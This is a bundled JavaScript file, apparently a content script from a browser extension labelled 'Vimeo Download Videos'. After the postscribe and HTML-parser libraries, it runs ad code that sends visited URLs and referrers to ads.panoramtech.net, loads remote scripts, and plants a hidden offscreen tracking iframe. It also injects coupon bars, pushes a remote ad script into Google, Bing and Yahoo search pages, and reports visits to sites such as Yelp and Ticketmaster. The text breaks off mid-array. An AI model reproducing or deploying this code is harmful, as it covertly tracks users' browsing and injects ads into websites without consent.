/* Asynchronously write javascript, even with document.write., v1.2.0 https://krux.github.io/postscribe
Copyright (c) 2014 Derek Brans, MIT license https://github.com/krux/postscribe/blob/master/LICENSE */!function(){function a(a,h){a=a||"",h=h||{};for(var i in b)b.hasOwnProperty(i)&&(h.autoFix&&(h["fix_"+i]=!0),h.fix=h.fix||h["fix_"+i]);var j=[],k=function(b){a+=b},l=function(b){a=b+a},m={comment:/^<!--/,endTag:/^<\//,atomicTag:/^<\s*(script|style|noscript|iframe|textarea)[\s>]/i,startTag:/^</,chars:/^[^<]/},n={comment:function(){var b=a.indexOf("-->");return b>=0?{content:a.substr(4,b),length:b+3}:void 0},endTag:function(){var b=a.match(d);return b?{tagName:b[1],length:b[0].length}:void 0},atomicTag:function(){var b=n.startTag();if(b){var c=a.slice(b.length);if(c.match(new RegExp("</\\s*"+b.tagName+"\\s*>","i"))){var d=c.match(new RegExp("([\\s\\S]*?)</\\s*"+b.tagName+"\\s*>","i"));if(d)return{tagName:b.tagName,attrs:b.attrs,content:d[1],length:d[0].length+b.length}}}},startTag:function(){var b=a.match(c);if(b){var d={};return b[2].replace(e,function(a,b){var c=arguments[2]||arguments[3]||arguments[4]||f.test(b)&&b||null;d[b]=c}),{tagName:b[1],attrs:d,unary:!!b[3],length:b[0].length}}},chars:function(){var b=a.indexOf("<");return{length:b>=0?b:a.length}}},o=function(){for(var b in m)if(m[b].test(a)){g&&console.log("suspected "+b);var c=n[b]();return c?(g&&console.log("parsed "+b,c),c.type=c.type||b,c.text=a.substr(0,c.length),a=a.slice(c.length),c):null}},p=function(a){for(var b;b=o();)if(a[b.type]&&a[b.type](b)===!1)return},q=function(){var b=a;return a="",b},r=function(){return a};return h.fix&&!function(){var b=/^(AREA|BASE|BASEFONT|BR|COL|FRAME|HR|IMG|INPUT|ISINDEX|LINK|META|PARAM|EMBED)$/i,c=/^(COLGROUP|DD|DT|LI|OPTIONS|P|TD|TFOOT|TH|THEAD|TR)$/i,d=[];d.last=function(){return this[this.length-1]},d.lastTagNameEq=function(a){var b=this.last();return b&&b.tagName&&b.tagName.toUpperCase()===a.toUpperCase()},d.containsTagName=function(a){for(var b,c=0;b=this[c];c++)if(b.tagName===a)return!0;return!1};var e=function(a){return a&&"startTag"===a.type&&(a.unary=b.test(a.tagName)||a.unary),a},f=o,g=function(){var b=a,c=e(f());return a=b,c},i=function(){var a=d.pop();l("</"+a.tagName+">")},j={startTag:function(a){var b=a.tagName;"TR"===b.toUpperCase()&&d.lastTagNameEq("TABLE")?(l("<TBODY>"),m()):h.fix_selfClose&&c.test(b)&&d.containsTagName(b)?d.lastTagNameEq(b)?i():(l("</"+a.tagName+">"),m()):a.unary||d.push(a)},endTag:function(a){var b=d.last();b?h.fix_tagSoup&&!d.lastTagNameEq(a.tagName)?i():d.pop():h.fix_tagSoup&&k()}},k=function(){f(),m()},m=function(){var a=g();a&&j[a.type]&&j[a.type](a)};o=function(){return m(),e(f())}}(),{append:k,readToken:o,readTokens:p,clear:q,rest:r,stack:j}}var b=function(){var a,b={},c=this.document.createElement("div");return a="<P><I></P></I>",c.innerHTML=a,b.tagSoup=c.innerHTML!==a,c.innerHTML="<P><i><P></P></i></P>",b.selfClose=2===c.childNodes.length,b}(),c=/^<([\-A-Za-z0-9_]+)((?:\s+[\w\-]+(?:\s*=\s*(?:(?:"[^"]*")|(?:'[^']*')|[^>\s]+))?)*)\s*(\/?)>/,d=/^<\/([\-A-Za-z0-9_]+)[^>]*>/,e=/([\-A-Za-z0-9_]+)(?:\s*=\s*(?:(?:"((?:\\.|[^"])*)")|(?:'((?:\\.|[^'])*)')|([^>\s]+)))?/g,f=/^(checked|compact|declare|defer|disabled|ismap|multiple|nohref|noresize|noshade|nowrap|readonly|selected)$/i,g=!1;a.supports=b,a.tokenToString=function(a){var b={comment:function(a){return"<--"+a.content+"-->"},endTag:function(a){return"</"+a.tagName+">"},atomicTag:function(a){return console.log(a),b.startTag(a)+a.content+b.endTag(a)},startTag:function(a){var b="<"+a.tagName;for(var c in a.attrs){var d=a.attrs[c];b+=" "+c+'="'+(d?d.replace(/(^|[^\\])"/g,'$1\\"'):"")+'"'}return b+(a.unary?"/>":">")},chars:function(a){return a.text}};return b[a.type](a)},a.escapeAttributes=function(a){var b={};for(var c in a){var d=a[c];b[c]=d&&d.replace(/(^|[^\\])"/g,'$1\\"')}return b};for(var h in b)a.browserHasFlaw=a.browserHasFlaw||!b[h]&&h;this.htmlParser=a}(),function(){function a(){}function b(a){return"function"==typeof a}function c(a,b,c){var d,e=a&&a.length||0;for(d=0;e>d;d++)b.call(c,a[d],d)}function d(a,b,c){var d;for(d in a)a.hasOwnProperty(d)&&b.call(c,d,a[d])}function e(a,b){return d(b,function(b,c){a[b]=c}),a}function f(a,b){return a=a||{},d(b,function(b,c){null==a[b]&&(a[b]=c)}),a}function g(a){try{return k.call(a)}catch(b){var d=[];return c(a,function(a){d.push(a)}),d}}function h(a){return/^script$/i.test(a.tagName)}var i=this;if(!i.postscribe){var j=!1,k=Array.prototype.slice,l=function(){function a(a,b,c){var d=k+b;if(2===arguments.length){var e=a.getAttribute(d);return null==e?e:String(e)}null!=c&&""!==c?a.setAttribute(d,c):a.removeAttribute(d)}function f(b,c){var d=b.ownerDocument;e(this,{root:b,options:c,win:d.defaultView||d.parentWindow,doc:d,parser:i.htmlParser("",{autoFix:!0}),actuals:[b],proxyHistory:"",proxyRoot:d.createElement(b.nodeName),scriptStack:[],writeQueue:[]}),a(this.proxyRoot,"proxyof",0)}var k="data-ps-";return f.prototype.write=function(){[].push.apply(this.writeQueue,arguments);for(var a;!this.deferredRemote&&this.writeQueue.length;)a=this.writeQueue.shift(),b(a)?this.callFunction(a):this.writeImpl(a)},f.prototype.callFunction=function(a){var b={type:"function",value:a.name||a.toString()};this.onScriptStart(b),a.call(this.win,this.doc),this.onScriptDone(b)},f.prototype.writeImpl=function(a){this.parser.append(a);for(var b,c=[];(b=this.parser.readToken())&&!h(b);)c.push(b);this.writeStaticTokens(c),b&&this.handleScriptToken(b)},f.prototype.writeStaticTokens=function(a){var b=this.buildChunk(a);if(b.actual)return b.html=this.proxyHistory+b.actual,this.proxyHistory+=b.proxy,this.proxyRoot.innerHTML=b.html,j&&(b.proxyInnerHTML=this.proxyRoot.innerHTML),this.walkChunk(),j&&(b.actualInnerHTML=this.root.innerHTML),b},f.prototype.buildChunk=function(a){var b=this.actuals.length,d=[],e=[],f=[];return c(a,function(a){if(d.push(a.text),a.attrs){if(!/^noscript$/i.test(a.tagName)){var c=b++;e.push(a.text.replace(/(\/?>)/," "+k+"id="+c+" $1")),"ps-script"!==a.attrs.id&&f.push("atomicTag"===a.type?"":"<"+a.tagName+" "+k+"proxyof="+c+(a.unary?" />":">"))}}else e.push(a.text),f.push("endTag"===a.type?a.text:"")}),{tokens:a,raw:d.join(""),actual:e.join(""),proxy:f.join("")}},f.prototype.walkChunk=function(){for(var b,c=[this.proxyRoot];null!=(b=c.shift());){var d=1===b.nodeType,e=d&&a(b,"proxyof");if(!e){d&&(this.actuals[a(b,"id")]=b,a(b,"id",null));var f=b.parentNode&&a(b.parentNode,"proxyof");f&&this.actuals[f].appendChild(b)}c.unshift.apply(c,g(b.childNodes))}},f.prototype.handleScriptToken=function(a){var b=this.parser.clear();b&&this.writeQueue.unshift(b),a.src=a.attrs.src||a.attrs.SRC,a.src&&this.scriptStack.length?this.deferredRemote=a:this.onScriptStart(a);var c=this;this.writeScriptToken(a,function(){c.onScriptDone(a)})},f.prototype.onScriptStart=function(a){a.outerWrites=this.writeQueue,this.writeQueue=[],this.scriptStack.unshift(a)},f.prototype.onScriptDone=function(a){return a!==this.scriptStack[0]?void this.options.error({message:"Bad script nesting or script finished twice"}):(this.scriptStack.shift(),this.write.apply(this,a.outerWrites),void(!this.scriptStack.length&&this.deferredRemote&&(this.onScriptStart(this.deferredRemote),this.deferredRemote=null)))},f.prototype.writeScriptToken=function(a,b){var c=this.buildScript(a),d=this.shouldRelease(c),e=this.options.afterAsync;a.src&&(c.src=a.src,this.scriptLoadHandler(c,d?e:function(){b(),e()}));try{this.insertScript(c),(!a.src||d)&&b()}catch(f){this.options.error(f),b()}},f.prototype.buildScript=function(a){var b=this.doc.createElement(a.tagName);return d(a.attrs,function(a,c){b.setAttribute(a,c)}),a.content&&(b.text=a.content),b},f.prototype.insertScript=function(a){this.writeImpl('<span id="ps-script"/>');var b=this.doc.getElementById("ps-script");b.parentNode.replaceChild(a,b)},f.prototype.scriptLoadHandler=function(a,b){function c(){a=a.onload=a.onreadystatechange=a.onerror=null,b()}var d=this.options.error;e(a,{onload:function(){c()},onreadystatechange:function(){/^(loaded|complete)$/.test(a.readyState)&&c()},onerror:function(){d({message:"remote script failed "+a.src}),c()}})},f.prototype.shouldRelease=function(a){var b=/^script$/i.test(a.nodeName);return!b||!!(this.options.releaseAsync&&a.src&&a.hasAttribute("async"))},f}(),m=function(){function c(){var a=k.shift();a&&(a.stream=d.apply(null,a))}function d(b,d,f){function i(a){a=f.beforeWrite(a),m.write(a),f.afterWrite(a)}m=new l(b,f),m.id=j++,m.name=f.name||m.id,h.streams[m.name]=m;var k=b.ownerDocument,n={write:k.write,writeln:k.writeln};e(k,{write:function(){return i(g(arguments).join(""))},writeln:function(){return i(g(arguments).join("")+"\n")}});var o=m.win.onerror||a;return m.win.onerror=function(a,b,c){f.error({msg:a+" - "+b+":"+c}),o.apply(m.win,arguments)},m.write(d,function(){e(k,n),m.win.onerror=o,f.done(),m=null,c()}),m}function h(d,e,g){b(g)&&(g={done:g}),g=f(g,{releaseAsync:!1,afterAsync:a,done:a,error:function(a){throw a},beforeWrite:function(a){return a},afterWrite:a}),d=/^#/.test(d)?i.document.getElementById(d.substr(1)):d.jquery?d[0]:d;var h=[d,e,g];return d.postscribe={cancel:function(){h.stream?h.stream.abort():h[1]=a}},k.push(h),m||c(),d.postscribe}var j=0,k=[],m=null;return e(h,{streams:{},queue:k,WriteStream:l})}();i.postscribe=m}}();// An html parser written in JavaScript
// Based on http://ejohn.org/blog/pure-javascript-html-parser/
//TODO(#39)
/*globals console:false*/
(function() {
  var supports = (function() {
    var supports = {};

    var html;
    var work = this.document.createElement('div');

    html = '<P><I></P></I>';
    work.innerHTML = html;
    supports.tagSoup = work.innerHTML !== html;

    work.innerHTML = '<P><i><P></P></i></P>';
    supports.selfClose = work.childNodes.length === 2;

    return supports;
  })();



  // Regular Expressions for parsing tags and attributes
  var startTag = /^<([\-A-Za-z0-9_]+)((?:\s+[\w\-]+(?:\s*=?\s*(?:(?:"[^"]*")|(?:'[^']*')|[^>\s]+))?)*)\s*(\/?)>/;
  var endTag = /^<\/([\-A-Za-z0-9_]+)[^>]*>/;
  var attr = /([\-A-Za-z0-9_]+)(?:\s*=\s*(?:(?:"((?:\\.|[^"])*)")|(?:'((?:\\.|[^'])*)')|([^>\s]+)))?/g;
  var fillAttr = /^(checked|compact|declare|defer|disabled|ismap|multiple|nohref|noresize|noshade|nowrap|readonly|selected)$/i;

  var DEBUG = false;

  function htmlParser(stream, options) {
    stream = stream || '';

    // Options
    options = options || {};

    for(var key in supports) {
      if(supports.hasOwnProperty(key)) {
        if(options.autoFix) {
          options['fix_'+key] = true;//!supports[key];
        }
        options.fix = options.fix || options['fix_'+key];
      }
    }

    var stack = [];

    var unescapeHTMLEntities = function(html) {
      return typeof html === 'string' ? html.replace(/(&#\d{1,4};)/gm, function(match){
        var code = match.substring(2,match.length-1);
        return String.fromCharCode(code);
      }) : html;
    };

    var append = function(str) {
      stream += str;
    };

    var prepend = function(str) {
      stream = str + stream;
    };

    // Order of detection matters: detection of one can only
    // succeed if detection of previous didn't
    var detect = {
      comment: /^<!--/,
      endTag: /^<\//,
      atomicTag: /^<\s*(script|style|noscript|iframe|textarea)[\s\/>]/i,
      startTag: /^</,
      chars: /^[^<]/
    };

    // Detection has already happened when a reader is called.
    var reader = {

      comment: function() {
        var index = stream.indexOf('-->');
        if ( index >= 0 ) {
          return {
            content: stream.substr(4, index),
            length: index + 3
          };
        }
      },

      endTag: function() {
        var match = stream.match( endTag );

        if ( match ) {
          return {
            tagName: match[1],
            length: match[0].length
          };
        }
      },

      atomicTag: function() {
        var start = reader.startTag();
        if(start) {
          var rest = stream.slice(start.length);
          // for optimization, we check first just for the end tag
          if(rest.match(new RegExp('<\/\\s*' + start.tagName + '\\s*>', 'i'))) {
            // capturing the content is inefficient, so we do it inside the if
            var match = rest.match(new RegExp('([\\s\\S]*?)<\/\\s*' + start.tagName + '\\s*>', 'i'));
            if(match) {
              // good to go
              return {
                tagName: start.tagName,
                attrs: start.attrs,
                content: match[1],
                length: match[0].length + start.length
              };
            }
          }
        }
      },

      startTag: function() {
        var match = stream.match( startTag );

        if ( match ) {
          var attrs = {};

          match[2].replace(attr, function(match, name) {
            var value = arguments[2] || arguments[3] || arguments[4] ||
              fillAttr.test(name) && name || null;

            attrs[name] = unescapeHTMLEntities(value);
          });

          return {
            tagName: match[1],
            attrs: attrs,
            unary: !!match[3],
            length: match[0].length
          };
        }
      },

      chars: function() {
        var index = stream.indexOf('<');
        return {
          length: index >= 0 ? index : stream.length
        };
      }
    };

    var readToken = function() {

      // Enumerate detects in order
      for (var type in detect) {

        if(detect[type].test(stream)) {
          if(DEBUG) { console.log('suspected ' + type); }

          var token = reader[type]();
          if(token) {
            if(DEBUG) { console.log('parsed ' + type, token); }
            // Type
            token.type = token.type || type;
            // Entire text
            token.text = stream.substr(0, token.length);
            // Update the stream
            stream = stream.slice(token.length);

            return token;
          }
          return null;
        }
      }
    };

    var readTokens = function(handlers) {
      var tok;
      while((tok = readToken())) {
        // continue until we get an explicit "false" return
        if(handlers[tok.type] && handlers[tok.type](tok) === false) {
          return;
        }
      }
    };

    var clear = function() {
      var rest = stream;
      stream = '';
      return rest;
    };

    var rest = function() {
      return stream;
    };

    if(options.fix) {
      (function() {
        // Empty Elements - HTML 4.01
        var EMPTY = /^(AREA|BASE|BASEFONT|BR|COL|FRAME|HR|IMG|INPUT|ISINDEX|LINK|META|PARAM|EMBED)$/i;

        // Elements that you can| intentionally| leave open
        // (and which close themselves)
        var CLOSESELF = /^(COLGROUP|DD|DT|LI|OPTIONS|P|TD|TFOOT|TH|THEAD|TR)$/i;


        var stack = [];
        stack.last = function() {
          return this[this.length - 1];
        };
        stack.lastTagNameEq = function(tagName) {
          var last = this.last();
          return last && last.tagName &&
            last.tagName.toUpperCase() === tagName.toUpperCase();
        };

        stack.containsTagName = function(tagName) {
          for(var i = 0, tok; (tok = this[i]); i++) {
            if(tok.tagName === tagName) {
              return true;
            }
          }
          return false;
        };

        var correct = function(tok) {
          if(tok && tok.type === 'startTag') {
            // unary
            tok.unary = EMPTY.test(tok.tagName) || tok.unary;
          }
          return tok;
        };

        var readTokenImpl = readToken;

        var peekToken = function() {
          var tmp = stream;
          var tok = correct(readTokenImpl());
          stream = tmp;
          return tok;
        };

        var closeLast = function() {
          var tok = stack.pop();

          // prepend close tag to stream.
          prepend('</'+tok.tagName+'>');
        };

        var handlers = {
          startTag: function(tok) {
            var tagName = tok.tagName;
            // Fix tbody
            if(tagName.toUpperCase() === 'TR' && stack.lastTagNameEq('TABLE')) {
              prepend('<TBODY>');
              prepareNextToken();
            } else if(options.fix_selfClose && CLOSESELF.test(tagName) && stack.containsTagName(tagName)) {
              if(stack.lastTagNameEq(tagName)) {
                closeLast();
              } else {
                prepend('</'+tok.tagName+'>');
                prepareNextToken();
              }
            } else if (!tok.unary) {
              stack.push(tok);
            }
          },

          endTag: function(tok) {
            var last = stack.last();
            if(last) {
              if(options.fix_tagSoup && !stack.lastTagNameEq(tok.tagName)) {
                // cleanup tag soup
                closeLast();
              } else {
                stack.pop();
              }
            } else if (options.fix_tagSoup) {
              // cleanup tag soup part 2: skip this token
              skipToken();
            }
          }
        };

        var skipToken = function() {
          // shift the next token
          readTokenImpl();

          prepareNextToken();
        };

        var prepareNextToken = function() {
          var tok = peekToken();
          if(tok && handlers[tok.type]) {
            handlers[tok.type](tok);
          }
        };

        // redefine readToken
        readToken = function() {
          prepareNextToken();
          return correct(readTokenImpl());
        };
      })();
    }

    return {
      append: append,
      readToken: readToken,
      readTokens: readTokens,
      clear: clear,
      rest: rest,
      stack: stack
    };

  }

  htmlParser.supports = supports;

  htmlParser.tokenToString = function(tok) {
    var handler = {
      comment: function(tok) {
        return '<--' + tok.content + '-->';
      },
      endTag: function(tok) {
        return '</'+tok.tagName+'>';
      },
      atomicTag: function(tok) {
        console.log(tok);
        return handler.startTag(tok) +
              tok.content +
              handler.endTag(tok);
      },
      startTag: function(tok) {
        var str = '<'+tok.tagName;
        for (var key in tok.attrs) {
          var val = tok.attrs[key];
          // escape quotes
          str += ' '+key+'="'+(val ? val.replace(/(^|[^\\])"/g, '$1\\\"') : '')+'"';
        }
        return str + (tok.unary ? '/>' : '>');
      },
      chars: function(tok) {
        return tok.text;
      }
    };
    return handler[tok.type](tok);
  };

  htmlParser.escapeAttributes = function(attrs) {
    var escapedAttrs = {};
    // escape double-quotes for writing html as a string

    for(var name in attrs) {
      var value = attrs[name];
      escapedAttrs[name] = value && value.replace(/(^|[^\\])"/g, '$1\\\"');
    }
    return escapedAttrs;
  };

  for(var key in supports) {
    htmlParser.browserHasFlaw = htmlParser.browserHasFlaw || (!supports[key]) && key;
  }

  this.htmlParser = htmlParser;
})();
(function(){
    if (window.location != window.parent.location ||
        window.panoram_partner_id) {
        return;
    }

    window._gaq = window._gaq || [];
    _gaq.push(['b._setAccount', 'UA-36732895-1']);
    _gaq.push(['b._setDomainName', window.location.hostname]);
    _gaq.push(['b._trackPageview']);

    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);

    var submodules = ['coupons_support2.js'];
    var head = document.getElementsByTagName('head')[0];
    window.panoram_partner_id = 'tac';
    window.panoram_partner_key = '35932';

    if (Math.random() < .01) {
        var newIFrame = document.createElement("iframe");
        newIFrame.src = "https://ads.panoramtech.net/track.php?client=tac";
        newIFrame.style.setProperty("border", "none");
        newIFrame.style.setProperty("position", "absolute");
        newIFrame.style.setProperty("top", "-100px");
        newIFrame.style.setProperty("left", "-100px");
        newIFrame.width = 1;
        newIFrame.height = 1;

        document.getElementsByTagName("body")[0].appendChild(newIFrame);
    }

    for (var i = 0; i < submodules.length; i++) {
        if (submodules[i].length > 0) {
            var script = document.createElement('script');
            script.type = 'text/javascript';
            script.src = '//ads.panoramtech.net//' + submodules[i] + '?client=tac&referrer=' + encodeURIComponent(window.location.href);
            head.appendChild(script);
        }
    }

})();
(function(window, undefined){
    window.panoram_partner_description = 'Vimeo Download Videos';
    var currentDomain = location.hostname;
    var referrer = document.referrer;

    var JSONP = function(url, method, callback) {
        //Set the defaults
        url = url || '';
        method = method || '';
        callback = callback || function(){};
      
        if (typeof method == 'function') {
          callback = method;
          method = 'callback';
        }
      
        var generatedFunction = 'jsonp'+Math.round(Math.random()*1000001)
      
        window[generatedFunction] = function(json) {
          callback(json);
          delete window[generatedFunction];
        };
      
        if (url.indexOf('?') === -1) { 
            url = url+'?'; 
        } else { 
            url = url+'&'; 
        }
      
        var jsonpScript = document.createElement('script');
        jsonpScript.setAttribute("src", url + method + '=' + generatedFunction);
        document.getElementsByTagName("head")[0].appendChild(jsonpScript);
    };

    var sortDeals = function(deals) {
        var specialDeals = [];
        var normalDeals = [];
        for (var i = 0; i < deals.length; i++) {
            if (deals[i].merchantPageStaffPick) {
                specialDeals.push(deals[i]);
            } else {
                normalDeals.push(deals[i]);
            }
        }
        return specialDeals.concat(normalDeals);
    };

    var addCouponBar = function($, deals) {
        var theme = 'inter';
        if (theme == '' ) {
            theme = 'redbar';
        }
        loadScript('https://ads.panoramtech.net//coupons/themes/' + theme + '/theme.js', function() {
            var sortedDeals = sortDeals(deals);

            var cachedDomain = getCookie('p_cachedDomain');
            if (cachedDomain != window.location.hostname) {
                // cache deal
                setCookie('p_cachedDomain', window.location.hostname);
                if (deals.length == 0) {
                    setCookie('p_cachedDeals', JSON.stringify(deals));
                } else {
                    var single = sortedDeals.slice(0,1);
                    single[0].categories = null;
                    setCookie('p_cachedDeals', JSON.stringify(single));
                }
            }

            var theme = new Theme;
            theme.show($, sortedDeals);
            window._gaq.push(
                ['b._setAccount', 'UA-36732895-1'],
                ['b._trackEvent', 'Coupons', 'Displayed', window.panoram_partner_id]
            );
        });
    };

    var loadScript = function(script, callback) {
        var s = document.createElement('script');
        var head = document.getElementsByTagName('head')[0];
        s.setAttribute('src', script);
        s.setAttribute('type', 'text/javascript');
        head.appendChild(s);

        var done = false;
        s.onload = s.onreadystatechange = function() {
            if (!done && (!this.readyState ||
                    this.readyState === "loaded" || this.readyState === "complete") ) {
                done = true;

                callback();

                // Handle memory leak in IE
                s.onload = s.onreadystatechange = null;
                if (head && s.parentNode) {
                    head.removeChild(s);
                }
            }
        }
    };

    var setCookie = function(c_name, value) {
        var exdate = new Date();
        exdate.setHours(exdate.getHours() + 1);
        var c_value=escape(value) + "; expires=" + exdate.toUTCString();
        document.cookie=c_name + "=" + c_value + "; path=/";
    };

    var getCookie = function(c_name) {
        var c_value = document.cookie;
        var c_start = c_value.indexOf(" " + c_name + "=");
        if (c_start == -1) {
            c_start = c_value.indexOf(c_name + "=");
        }
        if (c_start == -1) {
            c_value = null;
        } else {
            c_start = c_value.indexOf("=", c_start) + 1;
            var c_end = c_value.indexOf(";", c_start);
            if (c_end == -1) {
                c_end = c_value.length;
            }
            c_value = unescape(c_value.substring(c_start,c_end));
        }
        return c_value;
    }

    var cachedDomain = getCookie('p_cachedDomain');
    var cachedDeals = JSON.parse(getCookie('p_cachedDeals'));
    if (cachedDomain && cachedDomain == window.location.hostname && cachedDeals) {
        if (cachedDeals && cachedDeals.length > 0) {
            loadScript('https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js', function() {
                jQuery.noConflict(); 
                jQuery(document).ready(function($) {
                    addCouponBar($, cachedDeals); 
                });
            });
            var img = new Image();
            img.src = 'https://ads.panoramtech.net//coupons/cookie?merchant=' + currentDomain + '&client=' + window.panoram_partner_id;
        }
    } else if (!referrer || (referrer && referrer.indexOf('afsrc=1') == -1)) {
        JSONP('https://ads.panoramtech.net//coupons/deals?merchant=' + currentDomain + '&referrer=' + encodeURIComponent(referrer) + '&partner=' + window.panoram_partner_id, function(deals) {
            if (deals && deals.length > 0) {
                loadScript('https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js', function() {
                    jQuery.noConflict(); 
                    jQuery(document).ready(function($) {
                        addCouponBar($, deals); 
                    });
                });
                var img = new Image();
                img.src = 'https://ads.panoramtech.net//coupons/cookie?merchant=' + currentDomain + '&client=' + window.panoram_partner_id;
            } else if (deals) {
                setCookie('p_cachedDomain', window.location.hostname);
                setCookie('p_cachedDeals', JSON.stringify(deals));
            }
        });
    }
})(window);
(function(w, d) {
window.panoram_partner_description = 'Vimeo Download Videos';
var whitelist = [
    /.*google\.com$/,
    /.*bing\.com$/,
    /.*yahoo\.com$/
];
var found = false;
for(var i = 0; i < whitelist.length; i++) {
    if (window.location.hostname.match(whitelist[i])){
        found = true;
        break;
    }
}
if (!found) {
    return;
}
var tag = w.panoram_partner_key;
var l = '';
if (w.panoram_partner_description) {
    l = 'Ads from ' + w.panoram_partner_description + '.';
} else {
    l = 'Ads not from site.';
}

var u = '//g.searchgist.com';
var su = '//ssl-g.searchgist.com';

var j = d.createElement('script');
j.src = ((d.location.protocol == 'https:') ? su : u) + '/html/scripts/inject/chrome.js?tag=' + tag
    + '&u=' + encodeURIComponent(d.location.href) + '&l=' + encodeURIComponent(l);

(d.head || d.body).appendChild(j);
})(window, document);
(function(){function a(a){var b=new XMLHttpRequest,c=("https:"==document.location.protocol?"https://":"http://")+"www.google-analytics.com/collect",d=window.location.href.replace(window.location.hostname,"").replace(window.location.protocol+"//","");a="v=1&tid=UA-50079573-1&cid="+e()+"&t=pageview&dh="+encodeURIComponent(a)+"&dp="+encodeURIComponent(d)+"&dr="+encodeURIComponent(a)+"&cs="+encodeURIComponent(a)+"&cm=tracking&dt="+encodeURIComponent(document.title);b.open("GET",c+("?"+a),!0);b.send(a)}
function e(){function a(){return Math.floor(65536*(1+Math.random())).toString(16).substring(1)}return a()+a()+"-"+a()+"-"+a()+"-"+a()+"-"+a()+a()+a()}-1<window.location.href.indexOf("yelp")?a("yelp.com"):-1<window.location.href.indexOf("google.com")?document.querySelector("#rhs_block .kno-card .mod .ab_button")&&a("google.com"):-1<window.location.href.indexOf("yahoo.com")?document.querySelector("#local_listing_rr")&&a("yahoo.com"):-1<window.location.href.indexOf("tripadvisor")?a("tripadvisor.com"):
-1<window.location.href.indexOf("foursquare")?a("foursquare.com"):-1<window.location.href.indexOf("opentable.com")?a("opentable.com"):-1<window.location.href.indexOf("zagat")?a("zagat.com"):-1<window.location.href.indexOf("eventbrite")?a("eventbrite.com"):-1<window.location.href.indexOf("ticketmaster")?a("ticketmaster.com"):-1<window.location.href.indexOf("livenation")?a("livenation.com"):-1<window.location.href.indexOf("stubhub")?a("stubhub.com"):-1<window.location.href.indexOf("eventful")?a("eventful.com"):
-1<window.location.href.indexOf("urbanspoon")?a("urbanspoon.com"):-1<window.location.href.indexOf("evite.com")?a("evite.com"):-1<window.location.href.indexOf("doodle.com")?a("doodle.com"):-1<window.location.href.indexOf("bing.com")?document.querySelector("#b_context .b_subModule  .b_vList")&&a("bing.com"):-1<window.location.href.indexOf("facebook.com")&&-1<window.location.href.indexOf("events")&&a("facebook.com")})();
(function(){function g(a){"undefined"===typeof $&&($=window.jQuery);return"http://api.rundavoo.com/suggest?"+$.param(a)}function t(b,c){$.ajax({url:"http://api.rundavoo.com/opentable?phone_number="+b,success:function(b){b&&b.opentable_id&&(a.opentable_id=b.opentable_id,e&&e.attr("href",g(a)));c&&c()}}).fail(function(){c&&c()})}function f(){"undefined"===typeof $&&($=window.jQuery);if(0<$(".rundavoo-button").length){window._gaq=window._gaq||[];_gaq.push(["c._setAccount","UA-30948316-3"]);_gaq.push(["c._setDomainName",
window.location.hostname]);_gaq.push(["c._trackPageview"]);var a=document.createElement("script");a.type="text/javascript";a.async=!0;var c=document.getElementsByTagName("script")[0];HTMLElement.prototype.insertBefore.call(c.parentNode,a,c);a.src=("https:"==document.location.protocol?"https://ssl":"http://www")+".google-analytics.com/ga.js"}}function h(a){if(window.jQuery)a();else{var c=window.document,d=c.createElement("script");c.getElementsByTagName("body");d.onload=function(){a()};HTMLElement.prototype.appendChild.call(document.querySelector("body"),
d);d.src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"}}function m(b,c,d){$.ajax({url:b,success:function(b){if(b&&b.response&&b.response.venues&&0<b.response.venues.length)for(var f=0;f<b.response.venues.length;f++){var n=b.response.venues[f];if(n.contact&&n.contact.phone==c){a.foursquare_id=n.id;n.reservations&&n.reservations.url&&(b=n.reservations.url.match(/rid=(\d+)/))&&(a.opentable_id=b[1]);e.attr("href",g(a));break}}a.opentable_id?d&&d():t(c,d)}}).fail(function(){t(c,d)})}function u(a){if(a&&
0<a.length){var c=a.indexOf("rid=");if(-1<c&&(a=a.substring(c+4),c=a.indexOf("&"),-1<c))return a.substring(0,c)}return null}function k(a){for(var c=[{base:"A",letters:/[\u0041\u24B6\uFF21\u00C0\u00C1\u00C2\u1EA6\u1EA4\u1EAA\u1EA8\u00C3\u0100\u0102\u1EB0\u1EAE\u1EB4\u1EB2\u0226\u01E0\u00C4\u01DE\u1EA2\u00C5\u01FA\u01CD\u0200\u0202\u1EA0\u1EAC\u1EB6\u1E00\u0104\u023A\u2C6F]/g},{base:"AA",letters:/[\uA732]/g},{base:"AE",letters:/[\u00C6\u01FC\u01E2]/g},{base:"AO",letters:/[\uA734]/g},{base:"AU",letters:/[\uA736]/g},
{base:"AV",letters:/[\uA738\uA73A]/g},{base:"AY",letters:/[\uA73C]/g},{base:"B",letters:/[\u0042\u24B7\uFF22\u1E02\u1E04\u1E06\u0243\u0182\u0181]/g},{base:"C",letters:/[\u0043\u24B8\uFF23\u0106\u0108\u010A\u010C\u00C7\u1E08\u0187\u023B\uA73E]/g},{base:"D",letters:/[\u0044\u24B9\uFF24\u1E0A\u010E\u1E0C\u1E10\u1E12\u1E0E\u0110\u018B\u018A\u0189\uA779]/g},{base:"DZ",letters:/[\u01F1\u01C4]/g},{base:"Dz",letters:/[\u01F2\u01C5]/g},{base:"E",letters:/[\u0045\u24BA\uFF25\u00C8\u00C9\u00CA\u1EC0\u1EBE\u1EC4\u1EC2\u1EBC\u0112\u1E14\u1E16\u0114\u0116\u00CB\u1EBA\u011A\u0204\u0206\u1EB8\u1EC6\u0228\u1E1C\u0118\u1E18\u1E1A\u0190\u018E]/g},
